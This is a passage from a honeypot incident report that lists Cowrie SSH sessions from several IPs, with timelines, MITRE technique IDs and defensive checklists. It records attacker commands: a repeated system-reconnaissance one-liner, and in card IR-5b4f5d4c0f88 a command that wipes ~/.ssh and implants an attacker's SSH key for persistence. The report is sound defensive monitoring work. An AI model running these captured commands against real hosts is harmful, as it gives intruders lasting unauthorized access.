| `2026-07-10 17:01:06` | `cowrie.client.kex` |
| `2026-07-10 17:01:08` | `cowrie.login.success` |
| `2026-07-10 17:01:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.113[.]140` to AbuseIPDB if not already reported
- [ ] Block `118.45.113[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04a8e3a86929

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:01 |
| **Last Seen** | 2026-07-10 17:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:01:32` | `cowrie.session.connect` |
| `2026-07-10 17:01:33` | `cowrie.client.version` |
| `2026-07-10 17:01:33` | `cowrie.client.kex` |
| `2026-07-10 17:01:34` | `cowrie.login.success` |
| `2026-07-10 17:01:35` | `cowrie.session.params` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.success` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:35` | `cowrie.command.input` |
| `2026-07-10 17:01:36` | `cowrie.log.closed` |
| `2026-07-10 17:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c7b7e9926a

| Field | Detail |
|---|---|
| **Source IP** | `181.48.97[.]163` |
| **First Seen** | 2026-07-10 17:01 |
| **Last Seen** | 2026-07-10 17:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:01:37` | `cowrie.session.connect` |
| `2026-07-10 17:01:38` | `cowrie.client.version` |
| `2026-07-10 17:01:38` | `cowrie.client.kex` |
| `2026-07-10 17:01:39` | `cowrie.login.success` |
| `2026-07-10 17:01:39` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.48.97[.]163` to AbuseIPDB if not already reported
- [ ] Block `181.48.97[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b775e26ad96

| Field | Detail |
|---|---|
| **Source IP** | `176.12.132[.]63` |
| **First Seen** | 2026-07-10 17:01 |
| **Last Seen** | 2026-07-10 17:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:01:45` | `cowrie.session.connect` |
| `2026-07-10 17:01:45` | `cowrie.client.version` |
| `2026-07-10 17:01:45` | `cowrie.client.kex` |
| `2026-07-10 17:01:47` | `cowrie.login.success` |
| `2026-07-10 17:01:47` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.12.132[.]63` to AbuseIPDB if not already reported
- [ ] Block `176.12.132[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3cf3f600d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:03 |
| **Last Seen** | 2026-07-10 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:03:47` | `cowrie.session.connect` |
| `2026-07-10 17:03:47` | `cowrie.client.version` |
| `2026-07-10 17:03:47` | `cowrie.client.kex` |
| `2026-07-10 17:03:48` | `cowrie.login.success` |
| `2026-07-10 17:03:49` | `cowrie.session.params` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.success` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.command.input` |
| `2026-07-10 17:03:49` | `cowrie.log.closed` |
| `2026-07-10 17:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca98e241f24

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:06 |
| **Last Seen** | 2026-07-10 17:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:06:04` | `cowrie.session.connect` |
| `2026-07-10 17:06:04` | `cowrie.client.version` |
| `2026-07-10 17:06:04` | `cowrie.client.kex` |
| `2026-07-10 17:06:05` | `cowrie.login.success` |
| `2026-07-10 17:06:06` | `cowrie.session.params` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.success` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.command.input` |
| `2026-07-10 17:06:06` | `cowrie.log.closed` |
| `2026-07-10 17:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2083b255a331

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 17:06 |
| **Last Seen** | 2026-07-10 17:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:06:05` | `cowrie.session.connect` |
| `2026-07-10 17:06:05` | `cowrie.client.version` |
| `2026-07-10 17:06:05` | `cowrie.client.kex` |
| `2026-07-10 17:06:06` | `cowrie.login.success` |
| `2026-07-10 17:06:07` | `cowrie.session.params` |
| `2026-07-10 17:06:07` | `cowrie.command.input` |
| `2026-07-10 17:06:07` | `cowrie.log.closed` |
| `2026-07-10 17:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b4f5d4c0f88

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-07-10 17:06 |
| **Last Seen** | 2026-07-10 17:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:06:43` | `cowrie.session.connect` |
| `2026-07-10 17:06:43` | `cowrie.client.version` |
| `2026-07-10 17:06:43` | `cowrie.client.kex` |
| `2026-07-10 17:06:44` | `cowrie.login.success` |
| `2026-07-10 17:06:45` | `cowrie.session.params` |
| `2026-07-10 17:06:45` | `cowrie.command.input` |
| `2026-07-10 17:06:45` | `cowrie.command.failed` |
| `2026-07-10 17:06:45` | `cowrie.log.closed` |
| `2026-07-10 17:06:46` | `cowrie.session.params` |
| `2026-07-10 17:06:46` | `cowrie.command.input` |
| `2026-07-10 17:06:46` | `cowrie.session.file_download` |
| `2026-07-10 17:06:46` | `cowrie.log.closed` |
| `2026-07-10 17:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82b4d3f0f94c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-07-10 17:06 |
| **Last Seen** | 2026-07-10 17:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:06:46` | `cowrie.session.connect` |
| `2026-07-10 17:06:46` | `cowrie.client.version` |
| `2026-07-10 17:06:46` | `cowrie.client.kex` |
| `2026-07-10 17:06:46` | `cowrie.login.success` |
| `2026-07-10 17:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00809f40c36f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-07-10 17:06 |
| **Last Seen** | 2026-07-10 17:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:06:46` | `cowrie.session.connect` |
| `2026-07-10 17:06:46` | `cowrie.client.version` |
| `2026-07-10 17:06:47` | `cowrie.client.kex` |
| `2026-07-10 17:06:47` | `cowrie.login.success` |
| `2026-07-10 17:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-737b1ca29aa8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:08 |
| **Last Seen** | 2026-07-10 17:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:08:19` | `cowrie.session.connect` |
| `2026-07-10 17:08:19` | `cowrie.client.version` |
| `2026-07-10 17:08:19` | `cowrie.client.kex` |
| `2026-07-10 17:08:21` | `cowrie.login.success` |
| `2026-07-10 17:08:22` | `cowrie.session.params` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.success` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.command.input` |
| `2026-07-10 17:08:22` | `cowrie.log.closed` |
| `2026-07-10 17:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfba564aa320

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-07-10 17:10 |
| **Last Seen** | 2026-07-10 17:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:10:06` | `cowrie.session.connect` |
| `2026-07-10 17:10:06` | `cowrie.client.version` |
| `2026-07-10 17:10:06` | `cowrie.client.kex` |
| `2026-07-10 17:10:08` | `cowrie.login.success` |
| `2026-07-10 17:10:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e5a04490c45

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-10 17:10 |
| **Last Seen** | 2026-07-10 17:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:10:14` | `cowrie.session.connect` |
| `2026-07-10 17:10:15` | `cowrie.client.version` |
| `2026-07-10 17:10:15` | `cowrie.client.kex` |
| `2026-07-10 17:10:17` | `cowrie.login.success` |
| `2026-07-10 17:10:18` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8cc69f58db1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:10 |
| **Last Seen** | 2026-07-10 17:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:10:26` | `cowrie.session.connect` |
| `2026-07-10 17:10:26` | `cowrie.client.version` |
| `2026-07-10 17:10:26` | `cowrie.client.kex` |
| `2026-07-10 17:10:27` | `cowrie.login.success` |
| `2026-07-10 17:10:29` | `cowrie.session.params` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.success` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:29` | `cowrie.command.input` |
| `2026-07-10 17:10:30` | `cowrie.log.closed` |
| `2026-07-10 17:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1956b7461fc5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:12 |
| **Last Seen** | 2026-07-10 17:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:12:33` | `cowrie.session.connect` |
| `2026-07-10 17:12:33` | `cowrie.client.version` |
| `2026-07-10 17:12:33` | `cowrie.client.kex` |
| `2026-07-10 17:12:34` | `cowrie.login.success` |
| `2026-07-10 17:12:35` | `cowrie.session.params` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.success` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:35` | `cowrie.command.input` |
| `2026-07-10 17:12:36` | `cowrie.log.closed` |
| `2026-07-10 17:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51f6d4c2bc83

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:14 |
| **Last Seen** | 2026-07-10 17:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:14:38` | `cowrie.session.connect` |
| `2026-07-10 17:14:38` | `cowrie.client.version` |
| `2026-07-10 17:14:38` | `cowrie.client.kex` |
| `2026-07-10 17:14:40` | `cowrie.login.success` |
| `2026-07-10 17:14:41` | `cowrie.session.params` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.success` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:41` | `cowrie.command.input` |
| `2026-07-10 17:14:42` | `cowrie.log.closed` |
| `2026-07-10 17:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6f15d8e1988

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:16 |
| **Last Seen** | 2026-07-10 17:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:16:43` | `cowrie.session.connect` |
| `2026-07-10 17:16:43` | `cowrie.client.version` |
| `2026-07-10 17:16:43` | `cowrie.client.kex` |
| `2026-07-10 17:16:44` | `cowrie.login.success` |
| `2026-07-10 17:16:45` | `cowrie.session.params` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
| `2026-07-10 17:16:45` | `cowrie.command.input` |
